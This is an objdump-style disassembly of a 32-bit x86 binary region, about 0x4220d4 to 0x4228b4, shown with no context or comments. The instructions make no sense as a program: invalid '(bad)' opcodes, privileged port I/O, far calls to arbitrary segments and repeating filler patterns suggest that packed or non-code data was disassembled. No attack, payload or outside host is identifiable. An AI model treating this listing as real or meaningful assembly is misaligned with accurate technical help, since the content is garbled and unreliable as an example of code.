  4220d4:	jg     0x422057
  4220d6:	jmp    FWORD PTR [ebx-0x69418801]
  4220dc:	push   0x4d47b457
  4220e1:	mov    ds:0x1d803,al
  4220e6:	add    BYTE PTR fs:[eax],al
  4220e9:	add    BYTE PTR [edx+0x67],dl
  4220ec:	sbb    bl,al
  4220ee:	push   ds
  4220ef:	add    eax,0xe2de0f45
  4220f4:	sub    DWORD PTR [ebx+0x12646de0],esi
  4220fa:	xlat   BYTE PTR ds:[ebx]
  4220fb:	lea    edi,[eax+0x34cf12e3]
  422101:	and    eax,0x17381fe5
  422106:	fstp   TBYTE PTR [ebx+esi*4-0x77]
  42210a:	or     DWORD PTR [edi-0x179a1f28],0x203106b2
  422114:	popf   
  422115:	pop    ebp
  422116:	jae    0x422106
  422118:	sub    al,0xbd
  42211a:	call   esp
  42211c:	ror    ch,0x47
  42211f:	add    dl,BYTE PTR [eax-0x7309942c]
  422125:	cmp    al,0x38
  422127:	call   0xa7751f3f
  42212c:	jl     0x4220e9
  42212e:	xor    BYTE PTR [edx],dh
  422130:	sub    edx,DWORD PTR [ebx-0x1d37f9c6]
  422136:	into   
  422137:	sub    al,0xb5
  422139:	out    0xc1,al
  42213b:	dec    eax
  42213c:	mov    edx,0x4f159c2d
  422141:	(bad)  
  422143:	stc    
  422144:	out    dx,al
  422145:	dec    ecx
  422146:	push   ebx
  422147:	mov    eax,ds:0x82c4e0ce
  42214c:	(bad)  
  42214d:	stc    
  42214e:	add    BYTE PTR [eax],al
  422150:	add    BYTE PTR [eax],al
  422152:	cmp    dh,dl
  422154:	cmp    ah,BYTE PTR [esi+edi*8]
  422157:	in     al,dx
  422158:	fimul  WORD PTR ds:[edi+0x23ac6bd5]
  42215f:	mov    ds:0xd8674f81,al
  422164:	add    DWORD PTR [eax],eax
  422166:	add    BYTE PTR fs:[eax],al
  422169:	add    BYTE PTR [ebx+0x37],bl
  42216c:	cmp    eax,0xb3f8e911
  422171:	sbb    ch,0xd3
  422174:	dec    eax
  422175:	sahf   
  422176:	cmp    BYTE PTR [edx-0x4b0f7ae2],al
  42217c:	(bad)  
  42217d:	stos   BYTE PTR es:[edi],al
  42217e:	add    eax,0xfbe2888e
  422183:	call   0x7ade:0x7bfdcded
  42218a:	xor    dl,BYTE PTR [ecx+0x34e4d985]
  422190:	jp     0x42211b
  422192:	cli    
  422193:	fs xor eax,0x414a9910
  422199:	push   es
  42219a:	adc    DWORD PTR [edi-0x4d3de2ca],eax
  4221a0:	add    eax,0x3984fa4b
  4221a5:	fisub  DWORD PTR [edx+0x69]
  4221a8:	test   DWORD PTR [ecx],0xdb885f51
  4221ae:	xor    DWORD PTR [ecx+ecx*2-0x589a94f6],esi
  4221b5:	cmp    edi,DWORD PTR ds:0x4fca18d7
  4221bb:	add    BYTE PTR [ebx+0x54fc8cd8],ch
  4221c1:	jae    0x422241
  4221c3:	retf   
  4221c4:	in     eax,dx
  4221c5:	xor    BYTE PTR [eax],0xcd
  4221c8:	call   0xd775b2e8
  4221cd:	add    DWORD PTR [eax],eax
  4221cf:	add    BYTE PTR [eax],al
  4221d1:	add    cl,bl
  4221d3:	mov    dh,0x66
  4221d5:	sbb    ebp,DWORD PTR [edi-0x25]
  4221d8:	std    
  4221d9:	neg    BYTE PTR [esi]
  4221db:	sub    esp,DWORD PTR [ebx-0x23]
  4221de:	in     eax,0x5e
  4221e0:	jae    0x4221a1
  4221e2:	retf   
  4221e3:	fadd   DWORD PTR [ecx]
  4221e5:	add    BYTE PTR [eax+eax*1+0x0],ah
  4221e9:	add    BYTE PTR [edi+0x41c1bf3f],ah
  4221ef:	mov    esp,0x33d10d42
  4221f4:	jge    0x4221c4
  4221f6:	gs push ds
  4221f8:	sub    BYTE PTR [edx-0x583d2d0d],0x49
  4221ff:	jnp    0x42219a
  422201:	dec    ebp
  422202:	ds adc eax,0xe5645340
  422208:	pop    esi
  422209:	pop    eax
  42220a:	fbld   TBYTE PTR [ecx-0x45928a9c]
  422210:	daa    
  422211:	scas   eax,DWORD PTR es:[edi]
  422212:	clc    
  422213:	xchg   BYTE PTR [esi],ah
  422215:	sbb    al,BYTE PTR [ecx]
  422217:	mov    esi,0x53b4cc14
  42221c:	mov    BYTE PTR [eax+0x1f],ch
  42221f:	push   edi
  422220:	and    edi,DWORD PTR [edx+0x112ae259]
  422226:	icebp  
  422227:	mov    edi,0xfa2629b2
  42222c:	mov    al,0x96
  42222e:	loopne 0x422231
  422230:	ja     0x4222ac
  422232:	test   al,0xb9
  422234:	outs   dx,DWORD PTR ds:[esi]
  422235:	push   edx
  422236:	lahf   
  422237:	scas   al,BYTE PTR es:[edi]
  422238:	test   BYTE PTR [ecx-0x31],0xf0
  42223c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42223d:	pop    ebx
  42223e:	ds pop edx
  422240:	xchg   ecx,eax
  422241:	dec    eax
  422242:	or     bh,BYTE PTR [ebx-0x1cdd4f12]
  422248:	scas   al,BYTE PTR es:[edi]
  422249:	jecxz  0x4221fa
  42224b:	mov    bl,0xbf
  42224d:	dec    eax
  42224e:	add    BYTE PTR [eax],al
  422250:	add    BYTE PTR [eax],al
  422252:	fidiv  DWORD PTR [edx]
  422254:	xchg   edi,eax
  422255:	mov    bh,bh
  422257:	scas   eax,DWORD PTR es:[edi]
  422258:	fbstp  TBYTE PTR [edx+0x3]
  42225b:	inc    ebp
  42225c:	mov    ds:0x7f39245c,eax
  422261:	lahf   
  422262:	das    
  422263:	fld    DWORD PTR [ecx]
  422265:	add    BYTE PTR [eax+eax*1+0x0],ah
  422269:	add    BYTE PTR [esi-0x4cfe5df8],ah
  42226f:	mov    fs,WORD PTR [ebx+edi*8-0x80]
  422273:	je     0x4221f7
  422275:	(bad)  
  422276:	outs   dx,DWORD PTR ds:[esi]
  422277:	push   0x27
  422279:	pop    esi
  42227a:	pop    ss
  42227b:	push   edi
  42227c:	ss mov eax,0xe118d2f1
  422282:	pop    esp
  422283:	fsubr  QWORD PTR [edi+0x272d589]
  422289:	inc    edi
  42228a:	sbb    DWORD PTR [eax+esi*1+0x69],esi
  42228e:	xlat   BYTE PTR ds:[ebx]
  42228f:	jnp    0x42228b
  422291:	dec    edx
  422292:	out    0xe0,al
  422294:	repnz clc 
  422296:	and    bl,BYTE PTR [eax]
  422298:	rcl    ch,0xf6
  42229b:	inc    esi
  42229c:	aaa    
  42229d:	add    eax,0xae59d9ff
  4222a2:	jne    0x42226c
  4222a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222a5:	mov    ecx,0x5249d414
  4222aa:	stc    
  4222ab:	ror    esp,0xab
  4222ae:	int3   
  4222af:	ins    BYTE PTR es:[edi],dx
  4222b0:	sub    bh,BYTE PTR [ebx]
  4222b2:	dec    eax
  4222b3:	mov    edx,0xea822230
  4222b8:	jmp    0x6655d703
  4222bd:	pop    edi
  4222be:	rcr    DWORD PTR [edx],0xb1
  4222c1:	cdq    
  4222c2:	mov    bh,0x4d
  4222c4:	fidivr DWORD PTR [edi-0x191817f4]
  4222ca:	leave  
  4222cb:	aas    
  4222cc:	cmp    DWORD PTR [eax+eax*1],ebx
  4222cf:	add    BYTE PTR [eax],al
  4222d1:	add    BYTE PTR [eax-0x1c],cl
  4222d4:	add    ebx,DWORD PTR [ebx-0x8270051]
  4222da:	pop    esi
  4222db:	sub    BYTE PTR [eax+0xb4c788f],bl
  4222e1:	fst    DWORD PTR [ebx+0x640001d9]
  4222e7:	add    BYTE PTR [eax],al
  4222e9:	add    BYTE PTR [esi+0x65],al
  4222ec:	scas   eax,DWORD PTR es:[edi]
  4222ed:	aad    0xfd
  4222ef:	mov    ds:0x2d80f917,eax
  4222f4:	ja     0x4222a7
  4222f6:	aam    0xac
  4222f8:	push   DWORD PTR [eax-0x31]
  4222fb:	stos   DWORD PTR es:[edi],eax
  4222fc:	or     eax,0xa4337b54
  422301:	div    BYTE PTR [edx+0x65408c83]
  422307:	or     DWORD PTR [esi],ecx
  422309:	in     al,dx
  42230a:	or     DWORD PTR [edi+0x1c],esi
  42230d:	jl     0x4222ab
  42230f:	add    eax,0xa5a6c47b
  422314:	pop    edi
  422315:	gs leave 
  422317:	es int 0xe1
  42231a:	adc    esp,esi
  42231c:	xor    al,0xeb
  42231e:	imul   esi,DWORD PTR [esi],0x5e
  422321:	xchg   esi,eax
  422322:	es (bad) 
  422324:	sub    ebx,esp
  422326:	fld    DWORD PTR [ecx-0x24e2d513]
  42232c:	aad    0x27
  42232e:	mov    eax,ds:0xbf73e4f6
  422333:	lahf   
  422334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422335:	xlat   BYTE PTR ds:[ebx]
  422336:	sub    esp,ebx
  422338:	xor    dl,bl
  42233a:	mov    ebp,ss
  42233c:	loope  0x422325
  42233e:	jnp    0x422335
  422340:	push   cs
  422341:	mov    ebx,0xe3969548
  422346:	arpl   WORD PTR [esi-0x7],ax
  422349:	mov    BYTE PTR [eax+0xa9b930],al
  42234f:	add    BYTE PTR [eax],al
  422351:	add    BYTE PTR [edx+0x4],dl
  422354:	mov    ds:0x72a6f682,al
  422359:	aam    0x6d
  42235b:	xor    dh,BYTE PTR [edx]
  42235d:	and    eax,0x5af288cf
  422362:	neg    ecx
  422364:	add    DWORD PTR [eax],eax
  422366:	add    BYTE PTR fs:[eax],al
  422369:	add    BYTE PTR [ebp+0x66],cl
  42236c:	cmp    DWORD PTR ds:0x51af30a9,eax
  422372:	and    BYTE PTR [ebx+0x20fa995a],dl
  422378:	xchg   DWORD PTR [esi+0x18],esp
  42237b:	adc    cl,BYTE PTR [esi]
  42237d:	add    al,0xbc
  42237f:	loope  0x42236c
  422381:	adc    BYTE PTR [ebx],al
  422383:	adc    dh,BYTE PTR [ebx]
  422385:	ja     0x4223a4
  422387:	js     0x42233c
  422389:	mov    dh,0x99
  42238b:	xchg   ebx,eax
  42238c:	xchg   edi,eax
  42238d:	rcr    bl,1
  42238f:	fucomi st,st(6)
  422391:	pop    eax
  422392:	pop    ebp
  422393:	sub    DWORD PTR [edx+esi*2],0xffffffec
  422397:	adc    eax,eax
  422399:	dec    ebx
  42239a:	inc    DWORD PTR [ecx]
  42239c:	ins    DWORD PTR es:[edi],dx
  42239d:	pusha  
  42239e:	fsub   DWORD PTR [eax+ecx*2+0x3d73596f]
  4223a5:	call   0xf74df113
  4223aa:	aas    
  4223ab:	jmp    0x1b56:0x35d055ca
  4223b2:	jg     0x4223ce
  4223b4:	jb     0x422426
  4223b6:	jno    0x422395
  4223b8:	gs xchg esi,eax
  4223ba:	lds    eax,FWORD PTR [eax+0x2d]
  4223bd:	inc    eax
  4223be:	dec    esp
  4223bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223c0:	cwde   
  4223c1:	jp     0x422349
  4223c3:	fcmovnbe st,st(1)
  4223c5:	(bad)  
  4223c7:	sub    eax,0x36f13977
  4223cc:	rcl    DWORD PTR ds:0x0,cl
  4223d2:	cmp    BYTE PTR [edx-0x6a],ch
  4223d5:	add    edx,esi
  4223d7:	(bad)  
  4223d8:	mov    ebp,0xdb4ef67b
  4223dd:	out    0x57,eax
  4223df:	sub    al,0x95
  4223e1:	das    
  4223e2:	pop    ebx
  4223e3:	fiadd  DWORD PTR [ecx]
  4223e5:	add    BYTE PTR [eax+eax*1+0x0],ah
  4223e9:	add    BYTE PTR [edx+0x7c],bh
  4223ec:	out    0x2a,eax
  4223ee:	mov    ecx,0x17144203
  4223f3:	push   ecx
  4223f4:	(bad)  
  4223f5:	dec    esi
  4223f6:	inc    ecx
  4223f7:	mov    ds:0x31bf528a,eax
  4223fc:	stos   DWORD PTR es:[edi],eax
  4223fd:	jecxz  0x42245d
  4223ff:	ins    DWORD PTR es:[edi],dx
  422400:	sbb    al,0x5c
  422402:	add    edi,DWORD PTR ds:0x7e5d5e3b
  422408:	stos   DWORD PTR es:[edi],eax
  422409:	loope  0x422391
  42240b:	fstp   DWORD PTR [ebx-0x77]
  42240e:	outs   dx,DWORD PTR ds:[esi]
  422410:	jne    0x42242c
  422412:	push   esi
  422413:	scas   al,BYTE PTR es:[edi]
  422414:	in     eax,0x24
  422416:	sub    edi,DWORD PTR [edi-0x66]
  422419:	jle    0x422426
  42241b:	ja     0x422447
  42241d:	dec    edi
  42241e:	jmpw   0x6d0c
  422422:	repnz xchg ecx,eax
  422424:	mov    esp,0xde9c93b6
  422429:	out    dx,eax
  42242a:	xor    DWORD PTR [ecx-0x78],ebp
  42242d:	scas   al,BYTE PTR es:[edi]
  42242e:	enter  0xe92,0xb9
  422432:	push   eax
  422433:	xchg   esp,eax
  422434:	push   0x1
  422436:	xchg   esp,eax
  422437:	mov    ebp,0x8d51e6b9
  42243c:	inc    esp
  42243d:	test   BYTE PTR [edi],0x80
  422440:	inc    eax
  422441:	std    
  422442:	adc    BYTE PTR [ebp+0x39099782],ch
  422448:	popa   
  422449:	outs   dx,DWORD PTR ds:[esi]
  42244a:	daa    
  42244b:	mov    esp,DWORD PTR [ecx+eiz*2+0x0]
  42244f:	add    BYTE PTR [eax],al
  422451:	add    cl,ch
  422453:	mov    ecx,0xf37a307a
  422458:	jmp    0x422453
  42245a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42245e:	jne    0x4223ea
  422460:	rol    DWORD PTR [esi+0x1dabf],cl
  422466:	add    BYTE PTR fs:[eax],al
  422469:	add    dl,ah
  42246b:	aaa    
  42246c:	add    eax,0x857492ce
  422471:	rcr    BYTE PTR [ecx-0x8],cl
  422474:	popa   
  422475:	mov    al,0xf3
  422477:	ficomp DWORD PTR [eax]
  422479:	mov    DWORD PTR [esi+eax*4],ebp
  42247c:	jl     0x42247a
  42247e:	in     eax,dx
  42247f:	inc    DWORD PTR [esi-0x32df06ef]
  422485:	in     eax,dx
  422486:	stos   BYTE PTR es:[edi],al
  422487:	in     eax,dx
  422488:	lock pop ds
  42248a:	inc    ebp
  42248b:	xor    bl,BYTE PTR [esi+0xd]
  42248e:	jb     0x42249f
  422490:	aad    0xec
  422492:	dec    eax
  422493:	pop    esp
  422494:	pop    ss
  422495:	imul   esp,ebp,0xbd8f0398
  42249b:	add    ecx,DWORD PTR [ebx]
  42249d:	lahf   
  42249e:	mov    edi,0xfed45d5f
  4224a3:	add    bl,bl
  4224a5:	add    DWORD PTR [ebx+0x3bed35ce],eax
  4224ab:	jo     0x4224e9
  4224ad:	jl     0x42243e
  4224af:	sar    DWORD PTR [ecx+ebp*4],0xec
  4224b3:	mov    esi,0x2de80870
  4224b8:	xor    eax,0x4bcaa728
  4224bd:	push   ss
  4224be:	and    bh,BYTE PTR [edi-0x51d2412d]
  4224c4:	inc    edx
  4224c5:	lahf   
  4224c6:	std    
  4224c7:	test   al,0x79
  4224c9:	fsub   QWORD PTR [esi-0x75]
  4224cc:	jle    0x4224cb
  4224ce:	add    BYTE PTR [eax],al
  4224d0:	add    BYTE PTR [eax],al
  4224d2:	pop    ebx
  4224d3:	inc    ecx
  4224d4:	pop    ebx
  4224d5:	iret   
  4224d6:	pop    ebx
  4224d7:	(bad)  
  4224d9:	aad    0xf
  4224db:	ss dec esp
  4224dd:	dec    esi
  4224de:	outs   dx,BYTE PTR ds:[esi]
  4224df:	mov    ah,0xdc
  4224e1:	stos   DWORD PTR es:[edi],eax
  4224e2:	and    ebx,ebx
  4224e4:	add    DWORD PTR [eax],eax
  4224e6:	add    BYTE PTR fs:[eax],al
  4224e9:	add    BYTE PTR [edi-0x75d24752],dh
  4224ef:	mov    ch,0x3b
  4224f1:	loope  0x422569
  4224f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f4:	push   0x3c59569e
  4224f9:	arpl   WORD PTR [edx],bp
  4224fb:	scas   eax,DWORD PTR es:[edi]
  4224fc:	mov    dh,BYTE PTR [ecx-0x3b86faf5]
  422502:	pop    eax
  422503:	add    eax,0xa3034b67
  422508:	data16 cmp dl,BYTE PTR [esi+eax*1]
  42250c:	mov    eax,ds:0x7cba54e9
  422511:	inc    eax
  422512:	aaa    
  422513:	push   ds
  422514:	fdiv   DWORD PTR [ebx+0x61]
  422517:	jae    0x422565
  422519:	xchg   edi,eax
  42251a:	inc    ebx
  42251b:	gs cs sahf 
  42251e:	push   ds
  42251f:	push   esp
  422520:	xchg   esi,eax
  422521:	push   es
  422522:	cmp    ch,BYTE PTR [eax+ebx*4+0x517c6de4]
  422529:	mov    cl,0xe8
  42252b:	in     eax,0x98
  42252d:	dec    edi
  42252e:	xchg   BYTE PTR [esi+0x7f],al
  422531:	pop    ecx
  422532:	jle    0x422513
  422534:	out    dx,al
  422535:	das    
  422536:	push   edi
  422537:	add    edx,0x88a7d682
  42253d:	lahf   
  42253e:	or     eax,0xdff3b52c
  422543:	push   eax
  422544:	xlat   BYTE PTR ds:[ebx]
  422545:	push   es
  422546:	imul   ebp,DWORD PTR [ebx+ecx*1-0x19b9e821],0x79
  422551:	add    BYTE PTR [ebx+0x7f3c6585],bl
  422557:	cld    
  422558:	(bad)  [edi-0x65be08a1]
  42255e:	jns    0x422543
  422560:	fisubr DWORD PTR [ecx+0x1db87]
  422566:	add    BYTE PTR fs:[eax],al
  422569:	add    BYTE PTR [esi-0x54b2e114],dh
  42256f:	or     al,0x88
  422571:	pop    ecx
  422572:	bound  eax,QWORD PTR [ebp-0xcd3cc61]
  422578:	push   eax
  422579:	imul   esp,DWORD PTR [eax-0x20],0xa
  42257d:	je     0x422528
  42257f:	pushf  
  422580:	jmp    0x4225c6
  422582:	fnstcw WORD PTR [ebx]
  422584:	outs   dx,BYTE PTR ds:[esi]
  422585:	xchg   ebx,eax
  422586:	push   es
  422587:	std    
  422588:	je     0x42250c
  42258a:	lods   al,BYTE PTR ds:[esi]
  42258b:	lods   eax,DWORD PTR ds:[esi]
  42258c:	in     al,dx
  42258d:	mov    ebx,0xd172fe06
  422592:	push   esp
  422593:	loop   0x422537
  422595:	adc    al,0xe1
  422597:	cdq    
  422598:	inc    ebx
  422599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42259a:	fcomp  QWORD PTR [esi]
  42259c:	xchg   edi,eax
  42259d:	inc    edx
  42259e:	add    al,0xe8
  4225a0:	in     eax,dx
  4225a1:	stos   BYTE PTR es:[edi],al
  4225a2:	sub    eax,0x1fcb1b96
  4225a7:	xor    BYTE PTR [ecx+0x0],al
  4225aa:	cmc    
  4225ab:	pop    ds
  4225ac:	dec    ebx
  4225ad:	sbb    BYTE PTR [esi*1+0xc97387f],dl
  4225b4:	mov    esi,0x55634640
  4225b9:	(bad)  
  4225ba:	(bad)  
  4225bb:	icebp  
  4225bc:	(bad)  
  4225bd:	xchg   edx,eax
  4225be:	jo     0x422623
  4225c0:	jb     0x422621
  4225c2:	aad    0xff
  4225c4:	pcmpgtw mm5,QWORD PTR [ebp-0x4]
  4225c8:	and    cl,BYTE PTR [esi]
  4225ca:	lods   al,BYTE PTR ds:[esi]
  4225cb:	hlt    
  4225cc:	loop   0x42255d
  4225ce:	add    BYTE PTR [eax],al
  4225d0:	add    BYTE PTR [eax],al
  4225d2:	outs   dx,BYTE PTR ds:[esi]
  4225d3:	jae    0x4225c5
  4225d5:	retf   0xcbfd
  4225d8:	jle    0x4225d1
  4225da:	repz xor eax,0x717a8ce9
  4225e0:	scas   al,BYTE PTR es:[edi]
  4225e1:	pusha  
  4225e2:	jmp    0x4225bf
  4225e4:	add    DWORD PTR [eax],eax
  4225e6:	add    BYTE PTR fs:[eax],al
  4225e9:	add    BYTE PTR [edx],bl
  4225eb:	sbb    ax,0xc343
  4225ef:	call   0xff3c07a0
  4225f4:	ds lahf 
  4225f6:	cwde   
  4225f7:	dec    edx
  4225f8:	imul   edx,DWORD PTR [edx],0xffffff97
  4225fb:	ret    0xcf2c
  4225fe:	jno    0x4225b3
  422600:	call   0xc298:0x8ab9785a
  422607:	add    al,BYTE PTR [ebx]
  422609:	sbb    DWORD PTR ds:0x78cfa0d1,0xffffffc0
  422610:	xchg   ebp,eax
  422611:	adc    DWORD PTR [ebx+0x50],edx
  422614:	shl    eax,1
  422616:	jns    0x4225c2
  422618:	loopne 0x42261a
  42261a:	outs   dx,DWORD PTR ds:[esi]
  42261b:	jle    0x42266b
  42261d:	xor    eax,0x29ecd76f
  422622:	inc    esp
  422623:	inc    eax
  422624:	in     al,0x72
  422626:	or     bh,al
  422628:	sub    DWORD PTR [esp+ebp*4],ebx
  42262b:	xor    edi,DWORD PTR [ebx]
  42262d:	(bad)  
  42262e:	cmp    BYTE PTR [esi-0x30],dh
  422631:	popf   
  422632:	jl     0x4225f1
  422634:	jl     0x4226ab
  422636:	sub    esi,DWORD PTR [edx]
  422638:	jo     0x422643
  42263a:	push   ds
  42263b:	push   ebx
  42263c:	jp     0x422673
  42263e:	(bad)  
  42263f:	cmp    ah,BYTE PTR [ebx]
  422641:	hlt    
  422642:	scas   al,BYTE PTR es:[edi]
  422643:	out    0x1f,eax
  422645:	and    bl,BYTE PTR [esi-0x46]
  422648:	pop    ss
  422649:	add    esi,ecx
  42264b:	repz fwait
  42264d:	sub    eax,0x0
  422652:	cmc    
  422653:	adc    al,0xae
  422655:	adc    ebp,edi
  422657:	mov    ebx,0x84e6f6fd
  42265c:	lds    ebp,FWORD PTR [edx+0x3f726936]
  422662:	dec    edi
  422663:	fadd   QWORD PTR [ecx]
  422665:	add    BYTE PTR [eax+eax*1+0x0],ah
  422669:	add    BYTE PTR [esi-0x365ba073],al
  42266f:	call   0x4667:0x7e91e022
  422676:	push   edx
  422677:	add    ecx,DWORD PTR [eax]
  422679:	adc    ah,BYTE PTR [ebx+0x60]
  42267c:	pop    ebx
  42267d:	shr    DWORD PTR [esi],0x6b
  422680:	es or  eax,0x5b45b85
  422686:	mov    ecx,0x5a712cca
  42268b:	shl    BYTE PTR [esi+0x463637f8],cl
  422691:	mov    WORD PTR [esi-0x631a6103],fs
  422697:	xchg   BYTE PTR [edx-0x5109ce5],bl
  42269d:	inc    esi
  42269e:	inc    ecx
  42269f:	jecxz  0x422670
  4226a1:	test   BYTE PTR [edx+edi*8+0x8],ah
  4226a5:	rdpmc  
  4226a7:	arpl   WORD PTR [ebx-0x36],bp
  4226aa:	scas   al,BYTE PTR es:[edi]
  4226ab:	sti    
  4226ac:	jae    0x4226e3
  4226ae:	fnstsw WORD PTR [esi+0x43]
  4226b1:	push   es
  4226b2:	sti    
  4226b3:	mov    edx,0xd4de585c
  4226b8:	jecxz  0x42266f
  4226ba:	out    dx,al
  4226bb:	cmp    al,0x42
  4226bd:	rcr    BYTE PTR [edi+0x43],cl
  4226c0:	mov    edx,0x9623578e
  4226c5:	in     al,dx
  4226c6:	out    dx,eax
  4226c7:	dec    edi
  4226c8:	int    0x13
  4226ca:	mov    dh,0x7e
  4226cc:	fidiv  WORD PTR [ebp+0x0]
  4226d2:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  4226d8:	mov    edi,0xbb1c16fb
  4226dd:	shl    ch,0xa5
  4226e0:	push   eax
  4226e1:	shl    BYTE PTR [ebx+0x640001dc],cl
  4226e7:	add    BYTE PTR [eax],al
  4226e9:	add    BYTE PTR [edi+esi*4],al
  4226ec:	xchg   esi,eax
  4226ed:	xchg   esi,eax
  4226ee:	xchg   ecx,eax
  4226ef:	lea    ebp,[edx]
  4226f1:	jo     0x422760
  4226f3:	and    DWORD PTR [edx+0x1d836a6b],eax
  4226f9:	and    DWORD PTR [ebx],ecx
  4226fb:	or     DWORD PTR [esi+0x2d],ebx
  4226fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226ff:	pop    ss
  422700:	or     eax,0x5b2e40d2
  422705:	push   edx
  422706:	or     al,0x19
  422708:	repnz pop ds
  42270a:	mov    edx,0xf4611648
  42270f:	add    eax,0x30c299a5
  422714:	retf   
  422715:	and    edx,DWORD PTR [ebx+0x48]
  422718:	push   ebp
  422719:	fcomp  QWORD PTR [ecx+0x3a]
  42271c:	shr    bh,1
  42271e:	adc    cl,BYTE PTR [ebx-0x3fc5299]
  422724:	sub    eax,0xc014d23d
  422729:	test   eax,0x459c32dc
  42272e:	out    dx,eax
  42272f:	xor    eax,0x667f137
  422734:	dec    BYTE PTR [ebx]
  422736:	xor    BYTE PTR [edi+0x5b],bh
  422739:	rcr    DWORD PTR ds:0x890f8ddf,cl
  42273f:	idiv   DWORD PTR [eax+0x32]
  422742:	add    al,0xfe
  422744:	(bad)  
  422745:	call   eax
  422747:	jp     0x422750
  422749:	sahf   
  42274a:	xchg   edx,eax
  42274b:	sub    dl,BYTE PTR [edi+0x4c]
  422751:	add    ah,dl
  422753:	sqrtps xmm6,xmm0
  422756:	(bad)  
  422758:	cmc    
  422759:	das    
  42275a:	sbb    BYTE PTR [eax],cl
  42275c:	xchg   ebx,eax
  42275d:	iret   
  42275e:	js     0x4226e1
  422760:	pop    edi
  422761:	sbb    DWORD PTR [edi],edx
  422763:	fld    QWORD PTR [ecx]
  422765:	add    BYTE PTR [eax+eax*1+0x0],ah
  422769:	add    BYTE PTR [ebx-0x16],al
  42276c:	adc    eax,0xffa6a8a1
  422771:	push   eax
  422772:	(bad)  
  422773:	or     edx,DWORD PTR [edx-0x5a8d8440]
  422779:	and    ah,BYTE PTR [edi]
  42277b:	inc    edi
  42277c:	rcr    dh,cl
  42277e:	ret    0x363e
  422781:	or     DWORD PTR ds:[eax-0x2049461],0x413ed1e9
  42278c:	lea    ecx,fs:[edi]
  42278f:	scas   al,BYTE PTR es:[edi]
  422790:	repnz fcom DWORD PTR [edi-0x76]
  422794:	adc    esi,DWORD PTR [ebx-0x12]
  422797:	push   cs
  422798:	xor    cl,BYTE PTR [ecx+0xb]
  42279b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42279c:	sub    DWORD PTR [edx-0x78da41de],esp
  4227a2:	enter  0xf385,0x8c
  4227a6:	out    dx,eax
  4227a7:	fldz   
  4227a9:	mov    eax,ds:0xbbc98363
  4227ae:	or     BYTE PTR [ebp+esi*4+0x32],al
  4227b2:	outs   dx,DWORD PTR ds:[esi]
  4227b3:	jg     0x422818
  4227b5:	xor    ecx,DWORD PTR [esi]
  4227b7:	imul   ebp,DWORD PTR [ecx],0xffffffff
  4227ba:	inc    esi
  4227bb:	push   ss
  4227bc:	or     DWORD PTR [edi],eax
  4227be:	mov    eax,0xe121288f
  4227c3:	pusha  
  4227c4:	fucom  st(7)
  4227c6:	loopne 0x42283e
  4227c8:	pop    esp
  4227c9:	jns    0x422804
  4227cb:	mov    WORD PTR [ecx+0x2e],ds
  4227d1:	add    ch,cl
  4227d3:	sub    eax,0xfbf54395
  4227d8:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4227de:	popa   
  4227df:	arpl   bx,si
  4227e1:	sar    DWORD PTR [ebx-0x23],cl
  4227e4:	add    DWORD PTR [eax],eax
  4227e6:	add    BYTE PTR fs:[eax],al
  4227e9:	add    dl,dh
  4227eb:	scas   al,BYTE PTR es:[edi]
  4227ec:	sbb    BYTE PTR [edx-0x390a5593],ch
  4227f2:	mov    ds:0xa6c298ff,al
  4227f7:	sbb    dl,BYTE PTR gs:[edx+0x3175f333]
  4227fe:	lods   al,BYTE PTR ds:[esi]
  4227ff:	mul    BYTE PTR [esi-0xd3723fb]
  422805:	xor    ebx,DWORD PTR [ebp+0x360a6c60]
  42280b:	and    DWORD PTR [edx+0x1a],esi
  42280e:	in     eax,0xbe
  422810:	mov    ebp,0x358848f3
  422815:	xchg   esp,eax
  422816:	or     al,0x9f
  422818:	inc    ecx
  422819:	retf   
  42281a:	scas   al,BYTE PTR es:[edi]
  42281b:	inc    esp
  42281c:	push   ecx
  42281d:	jmp    0x8ab4:0xddba90f9
  422824:	xchg   edx,eax
  422825:	sbb    ch,BYTE PTR [edi-0x14a13f0]
  42282b:	add    esp,DWORD PTR [edi-0x3c]
  42282e:	inc    esi
  42282f:	dec    edx
  422830:	inc    ebp
  422831:	mov    al,ds:0xfec9062c
  422836:	xor    dl,dl
  422838:	inc    eax
  422839:	mov    BYTE PTR [ebp-0x45239406],0x8a
  422840:	in     al,dx
  422841:	mov    ah,0x80
  422843:	(bad)  [ecx]
  422845:	sbb    esp,DWORD PTR [eax+0x89ee7cd]
  42284b:	adc    cl,BYTE PTR [ecx+eax*8+0x0]
  42284f:	add    BYTE PTR [eax],al
  422851:	add    BYTE PTR [ebx],dl
  422853:	fs out 0xb,eax
  422856:	test   DWORD PTR [ebx-0xce58301],0xd4e24cfc
  422860:	xor    eax,0x1dddffb
  422865:	add    BYTE PTR [eax+eax*1+0x0],ah
  422869:	add    BYTE PTR [ebp-0x1b],bl
  42286c:	mov    cl,0x5a
  42286e:	lea    edx,[ecx-0x660b969d]
  422874:	mov    esi,0xf616ae09
  422879:	(bad)  
  42287a:	sub    DWORD PTR [edx-0x3c1bb5c6],esp
  422880:	pusha  
  422881:	retf   
  422882:	das    
  422883:	inc    ebp
  422884:	and    BYTE PTR [ecx],dh
  422886:	cmp    bh,bh
  422888:	dec    edi
  422889:	test   bl,0x9b
  42288c:	sub    eax,0xb9fa0ee9
  422891:	sbb    al,0x1b
  422893:	cmp    esp,esi
  422895:	jle    0x4228a0
  422897:	sbb    ebx,DWORD PTR [ecx-0x2aaeaca4]
  42289d:	xchg   DWORD PTR [edi-0x40],eax
  4228a0:	imul   edi,DWORD PTR [ecx+0x39],0x47d09788
  4228a7:	pop    ds
  4228a8:	sbb    DWORD PTR [ebx],esp
  4228aa:	retf   
  4228ab:	mov    bl,0xf6
  4228ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ae:	push   esp
  4228af:	mov    eax,0x4cedf9ec
  4228b4:	sub    edi,DWORD PTR [ebp-0x3a]
